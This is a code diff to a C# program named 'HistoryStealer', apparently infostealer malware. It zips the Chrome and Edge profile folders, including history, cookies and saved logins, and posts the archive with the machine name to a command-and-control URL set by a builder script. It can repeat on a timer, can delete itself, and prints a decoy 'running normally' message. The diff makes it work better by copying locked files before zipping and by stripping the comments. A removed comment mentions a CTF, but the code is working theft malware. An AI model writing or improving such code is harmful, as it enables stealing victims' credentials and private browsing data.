@@ -4,14 +4,12 @@ using System.IO.Compression;
 using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
-using Newtonsoft.Json; // Replaced System.Text.Json
 
 namespace HistoryStealer
 {
-    // Configuration class with hardcoded settings
     public class Config
     {
-        public static readonly string C2Url = "C2_URL_PLACEHOLDER"; // Replaced by builder.py
+        public static readonly string C2Url = "C2_URL_PLACEHOLDER";
         public static readonly string ChromePath = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
             @"Google\Chrome\User Data\Default");
@@ -19,12 +17,11 @@ namespace HistoryStealer
             Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
             @"Microsoft\Edge\User Data\Default");
         public static readonly string TempZipPath = Path.Combine(Path.GetTempPath(), "browser_data.zip");
-        public static readonly string Target = "BOTH"; // CHROME, EDGE, or BOTH
-        public static readonly int Hours = 0; // 0 for once, N for every N hours
-        public static readonly bool SelfDestruct = false; // true to enable self-destruction
+        public static readonly string Target = "BOTH";
+        public static readonly int Hours = 0;
+        public static readonly bool SelfDestruct = false;
     }
 
-    // Class to handle zipping browser data
     public class BrowserDataZipper
     {
         public static void CreateZip()
@@ -32,28 +29,50 @@ namespace HistoryStealer
             if (File.Exists(Config.TempZipPath))
                 File.Delete(Config.TempZipPath);
 
-            using (var zip = ZipFile.Open(Config.TempZipPath, ZipArchiveMode.Create))
+            string tempFolder = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
+            Directory.CreateDirectory(tempFolder);
+
+            try
             {
-                if (Config.Target == "CHROME" || Config.Target == "BOTH")
-                    AddFolderToZip(zip, Config.ChromePath, "chrome");
-                if (Config.Target == "EDGE" || Config.Target == "BOTH")
-                    AddFolderToZip(zip, Config.EdgePath, "edge");
+                using (var zip = ZipFile.Open(Config.TempZipPath, ZipArchiveMode.Create))
+                {
+                    if (Config.Target == "CHROME" || Config.Target == "BOTH")
+                        AddFolderToZip(zip, Config.ChromePath, "chrome", tempFolder);
+                    if (Config.Target == "EDGE" || Config.Target == "BOTH")
+                        AddFolderToZip(zip, Config.EdgePath, "edge", tempFolder);
+                }
+            }
+            finally
+            {
+                Directory.Delete(tempFolder, true);
             }
         }
 
-        private static void AddFolderToZip(ZipArchive zip, string folderPath, string entryPrefix)
+        private static void AddFolderToZip(ZipArchive zip, string folderPath, string entryPrefix, string tempFolder)
         {
             if (!Directory.Exists(folderPath))
                 return;
 
             foreach (var file in Directory.GetFiles(folderPath))
             {
-                zip.CreateEntryFromFile(file, Path.Combine(entryPrefix, Path.GetFileName(file)));
+                string tempFile = Path.Combine(tempFolder, Path.GetFileName(file));
+                try
+                {
+                    File.Copy(file, tempFile, true);
+                    zip.CreateEntryFromFile(tempFile, Path.Combine(entryPrefix, Path.GetFileName(file)));
+                }
+                catch (IOException)
+                {
+                }
+                finally
+                {
+                    if (File.Exists(tempFile))
+                        File.Delete(tempFile);
+                }
             }
         }
     }
 
-    // Class to handle uploading
     public class Uploader
     {
         private static readonly HttpClient client = new HttpClient();
@@ -67,37 +86,26 @@ namespace HistoryStealer
             {
                 using (var content = new MultipartFormDataContent())
                 {
-                    // Add JSON metadata
-                    var jsonData = new { ComputerName = computerName };
-                    var jsonContent = new StringContent(
-                        JsonConvert.SerializeObject(jsonData), // Replaced JsonSerializer
-                        System.Text.Encoding.UTF8,
-                        "application/json");
-                    content.Add(jsonContent, "metadata");
+                    content.Add(new StringContent(computerName), "computer_name");
 
-                    // Add zip file
                     var fileContent = new ByteArrayContent(File.ReadAllBytes(Config.TempZipPath));
                     fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip");
                     content.Add(fileContent, "file", "browser_data.zip");
 
-                    // Send to C2
                     await client.PostAsync(Config.C2Url, content);
                 }
             }
             catch (Exception)
             {
-                // Suppress errors for CTF simplicity
             }
             finally
             {
-                // Always delete zip after upload
                 if (File.Exists(Config.TempZipPath))
                     File.Delete(Config.TempZipPath);
             }
         }
     }
 
-    // Class for self-destruction
     public class SelfDestruct
     {
         public static void DeleteSelf()
@@ -121,33 +129,32 @@ namespace HistoryStealer
             }
             catch (Exception)
             {
-                // Suppress errors
             }
         }
     }
 
-class Program
-{
-    static void Main(string[] args)
+    class Program
     {
-        MainAsync().GetAwaiter().GetResult();
-    }
-
-    static async Task MainAsync()
-    {
-        do
+        static void Main(string[] args)
         {
-            BrowserDataZipper.CreateZip();
-            await Uploader.UploadZipAsync(Environment.MachineName);
-            if (Config.SelfDestruct)
+            MainAsync().GetAwaiter().GetResult();
+        }
+
+        static async Task MainAsync()
+        {
+            do
             {
-                SelfDestruct.DeleteSelf();
-                break;
-            }
-            if (Config.Hours > 0)
-                await Task.Delay(Config.Hours * 60 * 60 * 1000);
-        } while (Config.Hours > 0);
-        Console.WriteLine("Program running normally.");
+                BrowserDataZipper.CreateZip();
+                await Uploader.UploadZipAsync(Environment.MachineName);
+                if (Config.SelfDestruct)
+                {
+                    SelfDestruct.DeleteSelf();
+                    break;
+                }
+                if (Config.Hours > 0)
+                    await Task.Delay(Config.Hours * 60 * 60 * 1000);
+            } while (Config.Hours > 0);
+            Console.WriteLine("Program running normally.");
+        }
     }
-}
 }
